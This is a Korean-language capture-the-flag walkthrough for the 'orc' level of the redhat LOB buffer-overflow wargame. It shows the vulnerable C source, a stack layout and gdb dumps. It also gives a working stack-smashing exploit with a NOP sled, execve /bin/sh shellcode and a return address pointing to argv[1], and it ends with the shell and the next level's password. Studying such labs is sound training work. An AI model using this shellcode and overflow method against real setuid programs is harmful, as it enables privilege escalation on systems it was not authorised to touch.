============================================================================================================
[redhat-lob] (4) orc
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> a;

        a [shape=box, label="dummy * 19 + shellcode + (argv[1] address+4*i)"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="(argv[1] address+4*i)"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
    }


|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)
    SFP     (4byte)
    RET     (4byte)  
    argc    (4byte)  
    argv    (4byte)  <
    ----------------
    HIGH    
    ================

|

Buffer Overflow
============================================================================================================


Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[1]의 47번째 문자열이 "\\xbf"이어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./orc `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./orc `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================

argv[1]이 저장되는 주소 확인
------------------------------------------------------------------------------------------------------------

앞의 조건에 argv[1][47]값이 "\\xbf"인지 확인하기 때문에, gdb를 이용하여 argv[1]이 저장되는 주소(buffer)를 찾는다.

.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb)
    Note: breakpoint 1 also set at pc 0x8048500.
    Breakpoint 2 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/goblin/orc1 `python -c 'print "a"*47+"\xbf"'`

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()

    (gdb) i reg $esp
    esp            0xbffffaf8       -1073743112

    (gdb) i reg $ebp
    ebp            0xbffffb18       -1073743080

    (gdb) x/100x $esp

    ==========================================================================
    0xbffffaf8:     0xbffffb18      0x400309cb      0x00000002      0xbffffb44
    0xbffffb08:     0xbffffb50      0x40013868      0x00000002      0x08048450
    0xbffffb18:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffffb28:     0xbffffb44      0x08048390      0x0804860c      0x4000ae60
    0xbffffb38:     0xbffffb3c      0x40013e90      0x00000002      0xbffffc37
    0xbffffb48:     0xbffffc49      0x00000000      0xbffffc7a      0xbffffc9c
    0xbffffb58:     0xbffffca6      0xbffffcb4      0xbffffcd3      0xbffffce2
    0xbffffb68:     0xbffffcfb      0xbffffd17      0xbffffd36      0xbffffd41
    0xbffffb78:     0xbffffd4f      0xbffffd91      0xbffffda3      0xbffffdb8
    0xbffffb88:     0xbffffdc8      0xbffffdd4      0xbffffdf2      0xbffffdfd
    0xbffffb98:     0xbffffe0e      0xbffffe1f      0xbffffe27      0x00000000
    0xbffffba8:     0x00000003      0x08048034      0x00000004      0x00000020
    0xbffffbb8:     0x00000005      0x00000006      0x00000006      0x00001000
    0xbffffbc8:     0x00000007      0x40000000      0x00000008      0x00000000
    0xbffffbd8:     0x00000009      0x08048450      0x0000000b      0x000001f7
    0xbffffbe8:     0x0000000c      0x000001f7      0x0000000d      0x000001f7
    0xbffffbf8:     0x0000000e      0x000001f7      0x00000010      0x0fabfbff
    0xbffffc08:     0x0000000f      0xbffffc32      0x00000000      0x00000000
    0xbffffc18:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc28:     0x00000000      0x00000000      0x36690000      0x2f003638
    0xbffffc38:     0x656d6f68      0x626f672f      0x2f6e696c      0x3163726f
    0xbffffc48:     0x61616100      0x61616161      0x61616161      0x61616161 
                          ^               ^               ^ argv[1] = 0xbffffc51
    0xbffffc58:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffc68:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffc78:     0x454c00bf      0x504f5353      0x7c3d4e45      0x7273752f
    ==========================================================================



RET를 argv[1] 주소로 덮어씌워 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)  <- dummy*19 + shellcode(21)
    SFP     (4byte)   <- shellcode(4)
    RET     (4byte)   <- argv[1] 주소
    argv[1] (4byte)   
    ----------------
    HIGH    
    ================

|

오버플로우시 RET를 argv[1] 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다. buffer의 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.

.. code-block:: console

    $ ./orc `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x4c\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀L▒▒▒
    Segmentation fault
    
    $ ./orc `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x51\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀Q▒▒▒
    bash$ whoami
    orc
    bash$ my-pass
    euid = 504
    cantata

